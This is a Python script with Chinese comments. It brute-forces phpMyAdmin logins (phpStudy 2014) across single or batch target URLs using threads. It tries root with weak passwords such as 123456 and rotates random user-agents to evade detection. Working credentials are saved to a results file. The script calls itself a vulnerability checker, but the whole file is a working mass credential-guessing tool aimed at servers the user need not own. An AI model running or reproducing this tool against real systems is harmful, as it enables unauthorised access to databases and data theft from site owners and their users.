import argparse
import requests
import concurrent.futures
import sys
import random

def bao(url):
    url = url + '/phpmyadmin/index.php'
    username = ['root']
    password = ['123456', '111111', 'root']  # 对网站用户名和密码进行爆破！
    for i in username:
        for j in password:
            data = {
                "pma_username": i,
                "pma_password": j,
                "server": "1",
            }
            try:
                #读取 user-agents.txt 文件中的所有 user-agent 随机选择一个 user agent
                with open('user-agents.txt', 'r') as f:
                    useragents = f.readlines()
                random_useragent = random.choice(useragents).strip()
                headers = {'User-Agent': random_useragent}
                r = requests.post(url, data=data, headers=headers, verify=False, allow_redirects=True, timeout=5)
                if r.status_code == 200 and 'phpMyAdmin phpStudy 2014' in r.text:
                    print('\033[1;31m[+]%s Login Success！ username:%s & password:%s\033[0m' % (url, i, j))
                    with open('results.txt', 'a') as f:
                        f.write(url + ' username:%s & password:%s' % (i, j) + '\n')
                    # 登录成功退出
                    break
                else:
                    # print('Login False' % url)
                    pass
            except requests.exceptions.ConnectionError as e:
                print(f"连接失败")
                break
def pl(filename):
    with open(filename, 'r',encoding='utf-8') as f:
        urls = [line.strip() for line in f.readlines()]
    return urls

def help():
    helpinfo = """        _                                     _           _         ___   ___  __ _  _   
       | |                                   | |         (_)       |__ \ / _ \/_ | || |  
  _ __ | |__  _ __  _ __ ___  _   _  __ _  __| |_ __ ___  _ _ __      ) | | | || | || |_ 
 | '_ \| '_ \| '_ \| '_ ` _ \| | | |/ _` |/ _` | '_ ` _ \| | '_ \    / /| | | || |__   _|
 | |_) | | | | |_) | | | | | | |_| | (_| | (_| | | | | | | | | | |_ / /_| |_| || |  | |  
 | .__/|_| |_| .__/|_| |_| |_|\__, |\__,_|\__,_|_| |_| |_|_|_| |_(_)____|\___/ |_|  |_|  
 | |         | |               __/ |                                                     
 |_|         |_|              |___/                                                      
"""
    print(helpinfo)
    print("phpmyadmin2014".center(100, '*'))
    print(f"[+]{sys.argv[0]} -u --url http://www.xxx.com 即可进行单个漏洞检测")
    print(f"[+]{sys.argv[0]} -f --file targetUrl.txt 即可对选中文档中的网址进行批量检测")
    print(f"[+]{sys.argv[0]} -h --help 查看更多详细帮助信息")
    print("--@ztomato".rjust(100," "))

def main():
    parser = argparse.ArgumentParser(description='phpmyadmin2014弱口令漏洞单批检测脚本@ztomato')
    parser.add_argument('-u','--url', type=str, help='单个漏洞网址')
    parser.add_argument('-f','--file', type=str, help='批量检测文本')
    parser.add_argument('-t','--thread',type=int, help='线程，默认为5')
    args = parser.parse_args()
    thread = 5
    if args.thread:
        thread = args.thread
    if args.url:
        bao(args.url)
    elif args.file:
        urls = pl(args.file)
        with concurrent.futures.ThreadPoolExecutor(max_workers=thread) as executor:
            executor.map(bao, urls)
    else:
        help()
if __name__ == '__main__':
    main()